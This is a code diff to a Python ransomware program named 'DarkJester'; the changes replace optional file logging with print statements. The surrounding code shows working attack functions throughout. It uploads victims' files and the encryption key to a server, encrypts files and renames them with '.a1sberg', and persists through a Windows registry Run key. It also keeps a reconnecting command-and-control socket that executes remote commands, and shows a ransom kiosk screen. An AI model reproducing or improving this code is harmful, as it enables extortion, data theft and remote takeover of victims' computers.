@@ -18,16 +18,6 @@ import platform
 from concurrent.futures import ThreadPoolExecutor
 import re
 import time
-import logging
-
-# Configure file-based logging (optional)
-LOG_TO_FILE = False  # Set to True to enable logging to a file
-if LOG_TO_FILE:
-    logging.basicConfig(
-        filename="darkjester.log",
-        level=logging.INFO,
-        format="%(asctime)s - %(levelname)s - %(message)s"
-    )
 
 class DarkJester:
     def __init__(self, key_size=32, iv_size=16):
@@ -42,14 +32,11 @@ class DarkJester:
                 files = {'file': (filename, file_data)}
                 response = requests.post(server_url, files=files)
                 if response.status_code == 200:
-                    if LOG_TO_FILE:
-                        logging.info(f"File {filename} exfiltrated successfully.")
+                    print(f"File {filename} exfiltrated successfully")
                 else:
-                    if LOG_TO_FILE:
-                        logging.error(f"Failed to exfiltrate {filename}. Status code: {response.status_code}")
+                    print(f"Failed to exfiltrate {filename}. Status code: {response.status_code}")
         except Exception as e:
-            if LOG_TO_FILE:
-                logging.error(f"Error exfiltrating {filepath}: {e}")
+            print(f"Error exfiltrating {filepath}: {e}")
 
     def encrypt_file(self, filepath, server_url):
         try:
@@ -65,11 +52,9 @@ class DarkJester:
                 dst.write(self.iv + cipher.encrypt(padded_data))
             new_filepath = f"{filepath}.a1sberg"
             os.rename(filepath, new_filepath)
-            if LOG_TO_FILE:
-                logging.info(f"Encrypted: {filepath}")
+            print(f"Encrypted: {filepath}")
         except (PermissionError, OSError) as e:
-            if LOG_TO_FILE:
-                logging.error(f"Error encrypting {filepath}: {e}")
+            print(f"Error encrypting {filepath}: {e}")
 
     def encrypt_directory(self, directory, server_url, max_threads=30):
         with ThreadPoolExecutor(max_threads) as executor:
@@ -121,8 +106,7 @@ class DarkJester:
         try:
             requests.post(server_url, json=payload, headers={'Content-Type': 'application/json'})
         except requests.RequestException as e:
-            if LOG_TO_FILE:
-                logging.error(f"Error exfiltrating key: {e}")
+            print(f"Error exfiltrating key: {e}")
 
     def get_enabled_users(self):
         command = 'Get-LocalUser | Where-Object {$_.Enabled -eq $true} | Select-Object -ExpandProperty Name'
@@ -148,8 +132,7 @@ class C2_Server:
             winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
             winreg.CloseKey(registry_key)
         except Exception as e:
-            if LOG_TO_FILE:
-                logging.error(f"Error adding to registry: {e}")
+            print(f"Error adding to registry: {e}")
 
     def connect_to_server(self):
         while True:
@@ -159,8 +142,7 @@ class C2_Server:
                 client.connect((self.host, self.port))
                 return client
             except Exception as e:
-                if LOG_TO_FILE:
-                    logging.error(f"Connection failed: {e}")
+                print(f"Connection failed: {e}")
                 time.sleep(self.reconnect_interval)
 
     def execute_command(self, command):
@@ -215,8 +197,7 @@ class C2_Server:
                     response = f"{result}\n{self.response_delimiter}"
                     client.send(response.encode('utf-8'))
             except Exception as e:
-                if LOG_TO_FILE:
-                    logging.error(f"Connection lost: {e}")
+                print(f"Connection lost: {e}")
             finally:
                 client.close()
                 time.sleep(self.reconnect_interval)
@@ -429,12 +410,9 @@ class KioskApp:
             self.decrypted_files += 1
             self.feedback_label.config(text=f"Decrypting... {self.decrypted_files}/{self.total_files} files", fg="#FFFF00")
             self.root.update()
-            if LOG_TO_FILE:
-                logging.info(f"Successfully decrypted: {encrypted_file_path}")
             return True
         except Exception as e:
-            if LOG_TO_FILE:
-                logging.error(f"Error decrypting {encrypted_file_path}: {e}")
+            print(f"Error decrypting {encrypted_file_path}: {e}")
             return False
 
     def process_directory(self, root, files, key, max_threads=30):
@@ -476,8 +454,7 @@ class KioskApp:
                         self.root.update()
                         self.decrypt_directory(user_directory, decoded_key)
                     else:
-                        if LOG_TO_FILE:
-                            logging.error(f"User directory for {user} does not exist or is inaccessible.")
+                        self.feedback_label.config(text=f"User directory for {user} does not exist or is inaccessible.", fg="#FF0000")
                         success = False
                 if success and self.decrypted_files > 0:
                     self.feedback_label.config(text=f"Files decrypted successfully! Jester bows out. ({self.decrypted_files} files)", fg="#00FF00")
